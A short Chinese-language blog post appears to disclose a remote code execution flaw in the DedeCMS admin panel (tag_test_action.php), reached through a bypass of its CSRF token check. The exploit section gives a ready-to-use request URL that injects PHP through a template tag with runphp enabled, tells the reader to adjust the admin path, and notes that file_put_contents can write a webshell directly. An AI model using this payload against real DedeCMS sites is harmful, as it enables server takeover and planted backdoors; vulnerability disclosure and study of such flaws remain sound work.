---
title: "dedecms 后台代码执行"
date: 2018-03-30T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['rce', 'php']
categories: ['CMS']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

该漏洞的触发点为 /dede/tag_test_action.php. 起因是 csrf_check() 的绕过, 导致可执行任意代码.

<!--more-->

## EXP

`/dede/tag_test_action.php?url=a&token=&partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field}`

根据情况更改后台路径

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/30/1522407172.jpg)

file_put_contents 直接写 webshell